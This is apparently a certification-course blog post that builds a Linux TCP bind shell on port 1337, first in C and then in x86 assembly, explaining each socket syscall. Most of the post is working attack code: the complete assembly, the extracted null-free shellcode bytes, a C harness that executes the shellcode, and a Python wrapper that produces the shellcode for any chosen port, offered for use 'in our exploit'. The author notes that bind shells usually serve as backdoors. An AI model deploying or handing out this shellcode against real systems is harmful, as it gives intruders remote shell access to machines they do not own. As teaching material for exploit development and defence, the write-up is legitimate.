
# Creating a bind shell in x86 Assembly 

**What is a bind shell?**

A Bind shell is simply a program that listens for incoming connections. When a connection is made, a local shell is redirected to the newly created connection, thereby giving access to the local machine. Bind shells are usually created for backdoor access, although they could also be used for legitimate purposes, e.g. system administration.


## ok, nuff said, let's boogie

Our program will follow these steps:
1. Create a socket
2. Bind the socket
3. Listen for connections
4. Accept new connections
5. Execute shell

Before I solved this assignment, I wrote a version in C (with the help of my old university books), see below:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char **argv) {

    int listenfd, connfd;
    socklen_t len;
    struct sockaddr_in serveraddr, cliaddr;

    // Create a listen file descriptor
    listenfd = socket(AF_INET, SOCK_STREAM, 0);

    // Configure our server
    serveraddr.sin_family = AF_INET;
    serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);
    serveraddr.sin_port = htons(1337);

    // Bind the configured socket to our listendfd file descriptor
    bind(listenfd, (struct sockaddr*) &serveraddr, sizeof(serveraddr));

    // Listen on port 1337 on any address, allow a backlog of 2 connections
    listen(listenfd, 2);

    // Block until connection is made
    connfd = accept(listenfd, NULL, NULL);

    // Point the file descriptors STDIN,STDOUT,STDERR
    // to the new file descriptor created for the new connection
    dup2(connfd, 0);
    dup2(connfd, 1);
    dup2(connfd, 2);

    // Execute local program /bin/sh
    execv("/bin/sh", NULL, NULL);

    // Close file descriptors
    close(connfd);
    close(listenfd);

    return 0;
}
```

My idea was to disassemble the C version in order to better understand the underlying `syscalls` being made. However, I did not learn anything special from it. Instead, I used it as a reference point when writing in assembly.

Having programmed networked applications in C before, I know the syscalls that I am interested in are:
* socket
* bind
* listen
* accept

However these syscalls were not all present in `/usr/include/i386-linux-gnu/asm/unistd_32.h` which confused me a bit. My research told me it was because I was using a very old Ubuntu version:

```
Linux slae 3.5.0-51-generic #76-Ubuntu SMP Thu May 15 21:19:44 UTC 2014 i686 i686 i686 GNU/Linux

Distributor ID: Ubuntu
Description:    Ubuntu 12.10
Release:        12.10
Codename:       quantal
```

Instead I should use a wrapper syscall called `socketcall` in order to access the socket calls I am interested in.

Running `man 2 socketcall` revealed:

```
SOCKETCALL(2)                                                   Linux Programmer's Manual                                                  SOCKETCALL(2)

NAME
       socketcall - socket system calls

SYNOPSIS
       int socketcall(int call, unsigned long *args);

DESCRIPTION
       socketcall()  is  a  common  kernel  entry point for the socket system calls.  call determines which socket function to invoke.  args points to a
       block containing the actual arguments, which are passed through to the appropriate call.

       User programs should call the appropriate functions by their usual names.  Only standard library implementors and kernel  hackers  need  to  know
       about socketcall().
```

The first parameter is the syscall we want, the second parameter is the arguments for that syscall. We can find the correct syscall numbers here `/usr/include/linux/net.h`:

```
#define SYS_SOCKET      1               /* sys_socket(2)                */
#define SYS_BIND        2               /* sys_bind(2)                  */
#define SYS_CONNECT     3               /* sys_connect(2)               */
#define SYS_LISTEN      4               /* sys_listen(2)                */
#define SYS_ACCEPT      5               /* sys_accept(2)                */
#define SYS_GETSOCKNAME 6               /* sys_getsockname(2)           */
#define SYS_GETPEERNAME 7               /* sys_getpeername(2)           */
#define SYS_SOCKETPAIR  8               /* sys_socketpair(2)            */
#define SYS_SEND        9               /* sys_send(2)                  */
#define SYS_RECV        10              /* sys_recv(2)                  */
#define SYS_SENDTO      11              /* sys_sendto(2)                */
#define SYS_RECVFROM    12              /* sys_recvfrom(2)              */
#define SYS_SHUTDOWN    13              /* sys_shutdown(2)              */
#define SYS_SETSOCKOPT  14              /* sys_setsockopt(2)            */
#define SYS_GETSOCKOPT  15              /* sys_getsockopt(2)            */
#define SYS_SENDMSG     16              /* sys_sendmsg(2)               */
#define SYS_RECVMSG     17              /* sys_recvmsg(2)               */
#define SYS_ACCEPT4     18              /* sys_accept4(2)               */
#define SYS_RECVMMSG    19              /* sys_recvmmsg(2)              */
#define SYS_SENDMMSG    20              /* sys_sendmmsg(2)              */
```

So if we wanted to use `bind()` we would do `socketcall(2, *args)`. Before we do that though, we need the correct syscall for `socketcall`, we can find that in the same file:

```
[...]
#define __NR_fstatfs 100
#define __NR_ioperm 101
#define __NR_socketcall 102
#define __NR_syslog 103
#define __NR_setitimer 104
#define __NR_getitimer 105
[...]
```

Great, now we know how to use the wrapper in order perform our system calls.

### Creating a socket

Our code begins by creating a socket as I did in the C version:

```asm
global _start

section .text
_start:

    ; zero out registers
    xor eax, eax
    xor ebx, ebx
    xor edx, edx

    ; -------------------------------------
    ; # Setup socket
    
    ; socketcall()
    mov al, 0x66     ; __NR_socketcall 102
    mov bl, 0x1      ; SYS_SOCKET
```

The code begins by XOR:ing eax, ebx and edx by itself, this is to avoid any garbage data. Then we setup the `socketcall` by placing 102 in $eax (0x66 in hex) which indicates the system call we want to perform, then we place 1 `(SYS_SOCKET)` in ebx which is the first parameter for `socketcall`. When performing system calls, `eax` is usually the register that stores the syscall to perform while `ebx, ecx, edx` is the first, second and third parameter for that syscall.

Next step is to setup the arguments for running `SYS_SOCKET`. Running `man 2 socket` tells us what the function expects:
```
SOCKET(2)                                     Linux Programmer's Manual                                     SOCKET(2)

NAME
       socket - create an endpoint for communication

SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int socket(int domain, int type, int protocol);

DESCRIPTION
       socket() creates an endpoint for communication and returns a descriptor.

       The  domain argument specifies a communication domain; this selects the protocol family which will be used for
       communication.  These families are defined in <sys/socket.h>.  The currently understood formats include:

       Name                Purpose                          Man page
       AF_UNIX, AF_LOCAL   Local communication              unix(7)
       AF_INET             IPv4 Internet protocols          ip(7)
       AF_INET6            IPv6 Internet protocols          ipv6(7)
       AF_IPX              IPX - Novell protocols
       AF_NETLINK          Kernel user interface device     netlink(7)
       AF_X25              ITU-T X.25 / ISO-8208 protocol   x25(7)
       AF_AX25             Amateur radio AX.25 protocol
       AF_ATMPVC           Access to raw ATM PVCs
       AF_APPLETALK        Appletalk                        ddp(7)
       AF_PACKET           Low level packet interface       packet(7)

       The socket has the indicated type, which specifies the communication semantics.  Currently defined types are:

       SOCK_STREAM     Provides sequenced, reliable, two-way, connection-based byte  streams.   An  out-of-band  data
                       transmission mechanism may be supported
       [...]

       The  protocol  specifies  a  particular  protocol to be used with the socket.  Normally only a single protocol
       exists to support a particular socket type within a given protocol family, in which case protocol can be spec
       ified  as  0.  However, it is possible that many protocols may exist, in which case a particular protocol must
       be specified in this manner.  The protocol number to use is specific to the communication  domain  in  which
       communication  is  to take place; see protocols(5).  See getprotoent(3) on how to map protocol name strings to
       protocol numbers.

       [...]
```

The first parameter expects an int that indicates which family to use, this can be found in: `/usr/include/i386-linux-gnu/bits/socket.h`:
```
[...]
#define PF_INET         2       /* IP protocol family.  */
[...]
#define AF_INET         PF_INET
[...]
```

`AF_INET = 2`, great! The `type` parameter can be found in the same file:

```
/* Types of sockets.  */
enum __socket_type
{
  SOCK_STREAM = 1,              /* Sequenced, reliable, connection-based
                                   byte streams.  */
#define SOCK_STREAM SOCK_STREAM
  SOCK_DGRAM = 2,               /* Connectionless, unreliable datagrams
                                   of fixed maximum length.  */
[...]
```

Because we want to use TCP, we should use `SOCK_STREAM`. The end result looks like this:

```asm
    ; # Setup socket
    ; Resulting file descriptor is saved to eax
    push edx
    push 0x1
    push 0x2
    mov ecx, esp     ; Arguments are located top of the stack
    int 0x80         ; Tell the kernel it's time to boogie
    mov edi, eax     ; $eax contains the file descriptor created by socket(), store it in $edi for now
```

The arguments for `socket()` are pushed to the stack, $esp which points to the top of the stack is then copied to $ecx which will be the second parameter for `socketcall()`.

> Cool tip
> 
> In order to find information about syscalls and their parameters, running `grep -ir "SOCK_STREAM" .` in `/usr/include/` can give you a lot of information.

### Binding our socket

We have created the socket, now it's time to _bind_ it. This means `bind()` will assign the address and port to the socket referred to by the file descriptor created by `socket()` in the previous section.

As always, we run `man 2 bind`, which gives us:

```
BIND(2)                                                            Linux Programmer's Manual                                                            BIND(2)

NAME
       bind - bind a name to a socket

SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int bind(int sockfd, const struct sockaddr *addr,
                socklen_t addrlen);

DESCRIPTION
       When a socket is created with socket(2), it exists in a name space (address family) but has no address assigned to it.  bind() assigns the address spec
       ified by addr to the socket referred to by the file descriptor sockfd.  addrlen specifies the size, in bytes, of the address  structure  pointed  to  by
       addr.  Traditionally, this operation is called assigning a name to a socket.

       It is normally necessary to assign a local address using bind() before a SOCK_STREAM socket may receive connections (see accept(2)).

       The rules used in name binding vary between address families.  Consult the manual entries in Section 7 for detailed information.  For AF_INET see ip(7),
       for AF_INET6 see ipv6(7), for AF_UNIX see unix(7), for AF_APPLETALK see ddp(7), for AF_PACKET see packet(7), for AF_X25 see x25(7)  and  for  AF_NETLINK
       see netlink(7).

       The actual structure passed for the addr argument will depend on the address family.  The sockaddr structure is defined as something like:

           struct sockaddr {
               sa_family_t sa_family;
               char        sa_data[14];
           }

       The only purpose of this structure is to cast the structure pointer passed in addr in order to avoid compiler warnings.  See EXAMPLE below.
```

The interesting part here is the second parameter which expects `const struct sockaddr *addr`, in order to satisfy this requirement, we need to look at the struct definitions. However, according to the man pages, we should cast the struct `sockaddr_in` to `sockaddr`, so we should look for the struct definition of `sockaddr_in`. This can be found in: `/usr/include/linux/in.h`, this gives us:

```c
/* Structure describing an Internet (IP) socket address. */
#define __SOCK_SIZE__   16              /* sizeof(struct sockaddr)      */
struct sockaddr_in {
  __kernel_sa_family_t  sin_family;     /* Address family               */
  __be16                sin_port;       /* Port number                  */
  struct in_addr        sin_addr;       /* Internet address             */

  /* Pad to size of `struct sockaddr'. */
  unsigned char         __pad[__SOCK_SIZE__ - sizeof(short int) -
                        sizeof(unsigned short int) - sizeof(struct in_addr)];
};
#define sin_zero        __pad           /* for BSD UNIX comp. -FvK      */

struct in_addr {
        __be32  s_addr;
};

```

`__kernel_sa_family_t` is defined as `typedef unsigned short __kernel_sa_family_t;` in `/usr/include/linux/socket.h`. From these definitions, we can write the following instructions:


```asm
    ; setup sockaddr struct
    push edx         ; 0x0
    push word 0x3905 ; htons(1337)
    push word 0x2    ; AF_INET
```

The first `push` simply pushes 0x00000000 to the stack, this indicates we want to listen on `0.0.0.0`. The second push is our port number. We need to specify the port in network byte order (reverse) in order to listen on `1337`. `__be16` informs us that it expects 16 bits, therefore we push it as a `word`. Next push is the network family which we learned from the previous section that it is 0x2 for AF_INET (IPv4). The length of an `unsigned short` is 16 bits, therefore we push it as a `word`.

The complete instructions for binding our socket looks like this:

```asm
    ; ---------------------------------
    ; # Setup bind
    ; socketcall
    mov al, 0x66     ; socketcall()
    mov bl, 0x2      ; SYS_BIND 

    ; setup sockaddr struct
    push edx         ; Listen on 0.0.0.0
    push word 0x3905 ; htons(1337)
    push word 0x2    ; AF_INET

    mov ecx, esp     ; Store the address that points to our struct
    
    ; Push the arguments for bind()
    push 0x10        ; Length of __SOCK_SIZE__ which is 16 (0x10 in hex)
    push ecx         ; Points to our sockaddr_in struct
    push edi         ; Contains our file descriptor

    mov ecx, esp     ; Second parameter for socketcall, points to arguments required by bind()
    int 0x80         ; Tell the kernel let's go!
```


### Listen for incoming connections

Time to start listening for connections, let's see what the man page can tell us by running `man 2 listen`:

```
LISTEN(2)                                                          Linux Programmer's Manual                                                          LISTEN(2)

NAME
       listen - listen for connections on a socket

SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int listen(int sockfd, int backlog);

DESCRIPTION
       listen() marks the socket referred to by sockfd as a passive socket, that is, as a socket that will be used to accept incoming connection requests using
       accept(2).

       The sockfd argument is a file descriptor that refers to a socket of type SOCK_STREAM or SOCK_SEQPACKET.

       The backlog argument defines the maximum length to which the queue of pending connections for sockfd may grow.  If a connection request arrives when the
       queue  is  full,  the client may receive an error with an indication of ECONNREFUSED or, if the underlying protocol supports retransmission, the request
       may be ignored so that a later reattempt at connection succeeds.
```

This instruction set is easy, as can be seen below:

```asm
    ; --------------------
    ; # Setup listen
    ; socketcall
    mov al, 0x66     ; socketcall()
    mov bl, 0x4      ; SYS_LISTEN

    push 0x2         ; backlog, hold 2 connections in queue
    push edi         ; Our file descriptor
    mov ecx, esp     ; Second argument to socketcall() which points to the arguments for SYS_LISTEN
    int 0x80         ; Instruct the kernel to run our syscall
```

`listen()` requires just two arguments according to the man page.

### Accept new connections

We now need to accept connections that are trying to connect, what does `man 2 accept` say?

```
ACCEPT(2)                                                          Linux Programmer's Manual                                                          ACCEPT(2)

NAME
       accept - accept a connection on a socket

SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);

       #define _GNU_SOURCE             /* See feature_test_macros(7) */
       #include <sys/socket.h>

       int accept4(int sockfd, struct sockaddr *addr,
                   socklen_t *addrlen, int flags);

[ for the sake of brevity, full output is not shown]
```

We don't actually care about the second and third parameter for `accept()`, those are only needed if you want information about the connecting peer, e.g. its address. Therefore the instructions are quite easy:

```asm
    ; --------------------
    ; # Setup accept
    ; socketcall
    mov al, 0x66     ; socketcall()
    mov bl, 0x5      ; SYS_ACCEPT

    ; Setup accept
    push edx         ; 0x0
    push edx         ; 0x0
    push edi         ; Our file descriptor

    mov ecx, esp     ; Second argument to socketcall() which points to the arguments for SYS_ACCEPT

    int 0x80         ; Execute
    mov edi, eax     ; $eax stores the peer's file descriptor, save it to edi
```

### Redirection and shell access

We have accepted a connection, time to give it shell access. We use `dup2` to redirect STDIN, STDOUT and STDERR to the peer's file descriptor. `man 2 dup2`:

```
DUP(2)                                                             Linux Programmer's Manual                                                             DUP(2)

NAME
       dup, dup2, dup3 - duplicate a file descriptor

SYNOPSIS
       #include <unistd.h>

       int dup(int oldfd);
       int dup2(int oldfd, int newfd);

       #define _GNU_SOURCE             /* See feature_test_macros(7) */
       #include <fcntl.h>              /* Obtain O_* constant definitions */
       #include <unistd.h>

       int dup3(int oldfd, int newfd, int flags);

DESCRIPTION
       These system calls create a copy of the file descriptor oldfd.

       dup() uses the lowest-numbered unused descriptor for the new descriptor.

       dup2() makes newfd be the copy of oldfd, closing newfd first if necessary, but note the following:

       *  If oldfd is not a valid file descriptor, then the call fails, and newfd is not closed.

       *  If oldfd is a valid file descriptor, and newfd has the same value as oldfd, then dup2() does nothing, and returns newfd.

[ for the sake of brevity, full output is not shown]
```

By looking at the C version in the beginning of the article, we simply duplicate process by running `dup2` for STDIN, STDOUT and STDERR:

```
    ; --------------------
    ; # Setup dup2
    ; redirect to stdin
    mov al, 0x3f     ; syscall number dup2 63 --> 0x3f
    mov ebx, edi     ; peer's file descriptor
    mov ecx, edx     ; STDIN
    int 0x80

    ; redirect to stdout
    mov al, 0x3f
    mov cl, 0x1      ; STDOUT
    int 0x80

    ; redirect to stderr
    mov al, 0x3f
    mov cl, 0x2      ; STDERR
    int 0x80
```

Now it's time to execute `/bin/sh`. This is done by calling the `execv` system call, `man 3 execv`:

```
EXEC(3)                                                            Linux Programmer's Manual                                                            EXEC(3)

NAME
       execl, execlp, execle, execv, execvp, execvpe - execute a file

SYNOPSIS
       #include <unistd.h>

       extern char **environ;

       int execl(const char *path, const char *arg, ...);
       int execlp(const char *file, const char *arg, ...);
       int execle(const char *path, const char *arg,
                  ..., char * const envp[]);
       int execv(const char *path, char *const argv[]);
       int execvp(const char *file, char *const argv[]);
       int execvpe(const char *file, char *const argv[],
                  char *const envp[]);

   Feature Test Macro Requirements for glibc (see feature_test_macros(7)):

       execvpe(): _GNU_SOURCE

DESCRIPTION
       The  exec() family of functions replaces the current process image with a new process image.  The functions described in this manual page are front-ends
       for execve(2).  (See the manual page for execve(2) for further details about the replacement of the current process image.)

       The initial argument for these functions is the name of a file that is to be executed.

[ for the sake of brevity, full output is not shown]
```

We will use `execv` which requires two arguments, the file to be executed and additional arguments for the file being executed. We don't need any additional arguments, therefore we only pass `/bin/sh`, as can be seen below:

```
    ; --------------------
    ; # Setup execv
    xor edx, edx
    push edx
    
    ; push //bin/sh onto the stack
    push 0x68732f6e
    push 0x69622f2f  

    ; Set address of esp to ebx, which points
    ; to //bin/sh
    mov ebx, esp
    
    xor ecx, ecx
    xor eax, eax
    mov al, 0xb      ; execv syscall
    int 0x80
```

### Final code

Now we should have something that looks like this:

```asm

;---------------------------------
;
; Author: @dubs3c
; 
; Purpose:
; Start a bind shell on port 1337
; On connection, execute /bin/sh
;
;----------------------------------

global _start

section .text
_start:

    ; zero out registers
    xor eax, eax
    xor ebx, ebx
    xor edx, edx

    ; -------------------------------------
    ; # Setup socket
    
    ; socketcall()
    mov al, 0x66     ; __NR_socketcall 102
    mov bl, 0x1      ; SYS_SOCKET

    ; # Setup socket
    ; Resulting file descriptor is saved to eax
    push edx
    push 0x1
    push 0x2
    mov ecx, esp     ; Arguments are located top of the stack
    int 0x80         ; Tell the kernel it's time to boogie
    mov edi, eax     ; $eax contains the file descriptor created by socket(), store it in $edi for now

    ; ---------------------------------
    ; # Setup bind
    ; socketcall
    mov al, 0x66     ; socketcall()
    mov bl, 0x2      ; SYS_BIND 

    ; setup sockaddr struct
    push edx         ; Listen on 0.0.0.0
    push word 0x3905 ; htons(1337)
    push word 0x2    ; AF_INET

    mov ecx, esp     ; Store the address that points to our struct
    
    ; Push the arguments for bind()
    push 0x10        ; Length of __SOCK_SIZE__ which is 16 (0x10 in hex)
    push ecx         ; Points to our sockaddr_in struct
    push edi         ; Contains our file descriptor

    mov ecx, esp     ; Second parameter for socketcall, points to arguments required by bind()
    int 0x80         ; Tell the kernel let's go!
    
    ; --------------------
    ; # Setup listen
    ; socketcall
    mov al, 0x66     ; socketcall()
    mov bl, 0x4      ; SYS_LISTEN

    push 0x2         ; backlog, hold 2 connections in queue
    push edi         ; Our file descriptor
    mov ecx, esp     ; Second argument to socketcall() which points to the arguments for SYS_LISTEN
    int 0x80         ; Instruct the kernel to run our syscall

    ; --------------------
    ; # Setup accept
    ; socketcall
    mov al, 0x66     ; socketcall()
    mov bl, 0x5      ; SYS_ACCEPT

    ; Setup accept
    push edx         ; 0x0
    push edx         ; 0x0
    push edi         ; Our file descriptor

    mov ecx, esp     ; Second argument to socketcall() which points to the arguments for SYS_ACCEPT

    int 0x80         ; Execute
    mov edi, eax     ; $eax stores the peer's file descriptor, save it to edi

    ; --------------------
    ; # Setup dup2
    ; redirect to stdin
    mov al, 0x3f     ; syscall number dup2 63 --> 0x3f
    mov ebx, edi     ; peer's file descriptor
    mov ecx, edx     ; STDIN
    int 0x80

    ; redirect to stdout
    mov al, 0x3f
    mov cl, 0x1      ; STDOUT
    int 0x80

    ; redirect to stderr
    mov al, 0x3f
    mov cl, 0x2      ; STDERR
    int 0x80

    ; --------------------
    ; # Setup execv
    xor edx, edx
    push edx
    
    ; push //bin/sh onto the stack
    push 0x68732f6e
    push 0x69622f2f  

    ; Set address of esp to ebx, which points
    ; to //bin/sh
    mov ebx, esp
    
    xor ecx, ecx
    xor eax, eax
    mov al, 0xb      ; execv syscall
    int 0x80

    ; -----------------------------
    ; THE END - HAVE A NICE SHELL |
    ; -----------------------------
```
A screenshot of running the bind shell program can be seen below:

![image](slae-bind-shell.png)

The program is runnong port `1337` as seen in the top-right pane, and can be connected to by running `nc localhost 1337`. Once connected, normal linux commands can be used.

### Extracting shellcode

If we need a bind shell in our exploit, we can easily extract the assembly instructions as "shellcode", like so:

```
dubs3c@slae:~/SLAE/EXAM/assignment_1$ objdump -d ./assignment_1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed
's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x02\x52\x66\x68\x05\x39\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe
1\xcd\x80\xb0\x66\xb3\x04\x6a\x02\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\xb0\x3f\x89\xfb\x89\xd1\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb
0\x3f\xb1\x02\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xc0\xb0\x0b\xcd\x80"
```

To demonstrate, this C program will execute our shellcode and creating our bind shell:

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89"
"\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x02\x52\x66\x68\x05\x39\x66\x6a"
"\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a"
"\x02\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd"
"\x80\x89\xc7\xb0\x3f\x89\xfb\x89\xd1\xcd\x80\xb0\x3f\xb1\x01\xcd"
"\x80\xb0\x3f\xb1\x02\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68"
"\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xc0\xb0\x0b\xcd\x80";

main()
{
       printf("Shellcode Length:  %d\n", strlen(code));
       int (*ret)() = (int(*)())code;
       ret();
}
```

Compile with `gcc -fno-stack-protector -z execstack shellcode.c -o shellcode`. Shellcode length is 110.

## Making the listening port configurable

Right now the port `1337` is hardcoded, let's make a wrapper script in python which allows for setting a custom port.


```python
#!/usr/bin/env python3

import sys

def main(port):

    str_port = hex(port).replace('0x','').zfill(4)

    shellcode = r"\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x02\x52\x66\x68{port}\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x02\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\xb0\x3f\x89\xfb\x89\xd1\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xc0\xb0\x0b\xcd\x80"

    hex_port = "\\x{}\\x{}".format(str_port[:2], str_port[2:])

    if "\\x00" in hex_port:
        print("[-] Sorry, null byte found in that port, chose another port.")
        print("[-] Ports between 1-256 will always contain a null byte.")
        print("[-] Port: {}".format(hex_port))
        sys.exit(1)

    shellcode = shellcode.replace("{port}", hex_port)
    print("[+] Bind shell running on port {}".format(port))
    print("[+] Your Shellcode:")
    print(shellcode)


if __name__ == "__main__":
    if len(sys.argv) == 1:
        print("Usage: python3 wrapper.py <port>")
        sys.exit(0)

    if int(sys.argv[1]) < 1024:
        print("[!] Warning: Ports < 1024 must be run as a root")

    if len(sys.argv) == 2:
        if (int(sys.argv[1]) > 65535):
            print("Port too large")
            sys.exit(1)
        main(int(sys.argv[1]))
    else:
        main(1337)
```

Running the script with a custom port returns the new shellcode:

```
dubs3c@slae:~/SLAE/EXAM/assignment_1$ python wrapper.py 600
[!] Warning: Ports < 1024 must be run as a root
[+] Bind shell running on port 600
[+] Your Shellcode:
\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x02\x52\x66\x68\x02\x58\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x02\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\xb0\x3f\x89\xfb\x89\xd1\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xc0\xb0\x0b\xcd\x80
```

There you go, hack the planet!

---
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[https://www.pentesteracademy.com/course?id=3](https://www.pentesteracademy.com/course?id=3)

Student ID: SLAE-1490
